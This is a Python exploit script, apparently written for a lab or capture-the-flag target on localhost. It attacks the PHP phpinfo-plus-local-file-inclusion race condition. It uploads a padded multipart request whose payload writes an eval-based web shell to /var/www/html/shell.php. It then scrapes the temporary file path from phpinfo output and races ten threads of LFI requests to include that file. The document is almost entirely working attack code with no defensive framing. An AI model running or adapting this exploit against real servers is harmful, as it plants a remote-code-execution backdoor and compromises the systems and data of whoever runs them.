
from urllib.parse import urlsplit
from socket import socket,AF_INET,SOCK_STREAM,gethostbyname
import requests
import threading
import sys


tag="SECURITY"
payload=f"""{tag}
<?php file_put_contents('/var/www/html/shell.php', '<?=eval($_REQUEST[1])?>')?>"""
post_body=f"""-----------------------------7dbff1ded0714
Content-Disposition: form-data; name="dummyname"; filename="test.txt"
Content-Type: text/plain

{payload}
-----------------------------7dbff1ded0714--""".replace("\n","\r\n")
 

padding="x" * 5000
http_post=f"""POST /?a={padding} HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r
Accept: {padding}\r
User-Agent: {padding}\r
Accept-Language: {padding}\r
Pragma: {padding}\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: {len(post_body)}\r
Host: 127.0.0.1:16789\r
\r
{post_body}"""


tcp_payload = {"lfi":"""GET /?file={} HTTP/1.1
User-Agent: Mozilla/4.0
Proxy-Connection: Keep-Alive
Host: 127.0.0.1:16789


""".replace("\n","\r\n"),"phpinfo":http_post}

tmpfile_offset = 0

class EXP(threading.Thread):
    def __init__(self, host , port, event):
        threading.Thread.__init__(self)
        global tmpfile_offset
        self.event = event
        self.host = gethostbyname(host)
        self.port = port
        self.tmpfile_path = ""
        self.tmpfile_offset = tmpfile_offset if tmpfile_offset else self.__tmpfile_offset()

    def __tmpfile_offset(self):
        print("[+] trying to get offset ......")
        global tmpfile_offset
        host = self.host
        port = self.port
        s = socket(AF_INET,SOCK_STREAM)
        s.connect((host,port))
        s.send(tcp_payload["phpinfo"].encode("utf-8"))
        r = 0
        data = b""
        while 1:
            d = s.recv(0x1000)
            data += d
            if not d:
                break
            if d.endswith(b"\r\n\r\n"):
                break
        s.close()
        r = data.find(b"[tmp_name] =&gt;")
        r += len("[tmp_name] =&gt;") + 1
        self.tmpfile_offset = r
        tmpfile_offset = r
        
        return r


    def phpinfo_lfi(self):
        socket_phpinfo = socket(AF_INET,SOCK_STREAM)
        socket_phpinfo.connect(
            (self.host , self.port)
        )
        socket_lfi = socket(AF_INET,SOCK_STREAM)
        socket_lfi.connect(
            (self.host , self.port)
        )
        socket_phpinfo.send(tcp_payload["phpinfo"].encode("utf-8"))
        
        data = b""
        l = 0
        while len(data) < self.tmpfile_offset:
            d = socket_phpinfo.recv(0x1000)
            data += d

        self.tmpfile_path = data[self.tmpfile_offset:self.tmpfile_offset + len('/tmp/phpbKZj97')].decode("utf-8")
        socket_lfi.send(tcp_payload["lfi"].format(self.tmpfile_path).encode("utf-8"))
        r = socket_lfi.recv(0x1000)
        socket_phpinfo.close()
        socket_lfi.close()
        if r.find(tag.encode("utf-8")) != -1:
            return self.tmpfile_path

    def run(self):
        while not self.event.is_set():
            x = self.phpinfo_lfi()
            if x:
                print("[!] Get shell!!!")
                self.event.set()
        return

if __name__ == "__main__":
    event = threading.Event()
    event.clear()
    EXP("127.0.0.1",16789,event)
    print("[+] tmpfile offset : " + str(tmpfile_offset))
    tp = []
    for i in range(10):
        tp.append(EXP("127.0.0.1",16789,event))
    for t in tp:
        t.start()
    for t in tp:
        t.join()